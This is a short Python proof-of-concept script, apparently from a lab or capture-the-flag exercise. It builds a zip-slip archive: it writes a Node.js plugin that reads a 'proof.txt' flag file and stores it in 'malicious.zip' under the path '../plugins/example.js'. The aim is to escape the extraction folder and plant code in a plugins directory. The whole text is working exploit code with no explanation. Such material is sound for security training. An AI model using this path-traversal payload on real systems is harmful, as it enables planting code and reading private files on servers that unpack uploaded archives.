# POC代码生成恶意zip文件，是POC的一部分
import zipfile, pathlib

with open('shell.js', 'w') as f:
    f.write("""
            const fs = require("fs");
            exports.execute = async () => {
                const flagFilePath = '/home/student/notebook/proof.txt';
                if (!fs.existsSync(flagFilePath)) {
                return { message: "Flag file not found." };
                }
                const flag = fs.readFileSync(flagFilePath, 'utf8');
                return { message: `Flag: ${flag}` };
            };"""
    )

real_file = pathlib.Path('shell.js')
arc_name = "../plugins/example.js"
with zipfile.ZipFile('malicious.zip', 'w', zipfile.ZIP_DEFLATED) as zf:
    zf.write(real_file, arcname=arc_name)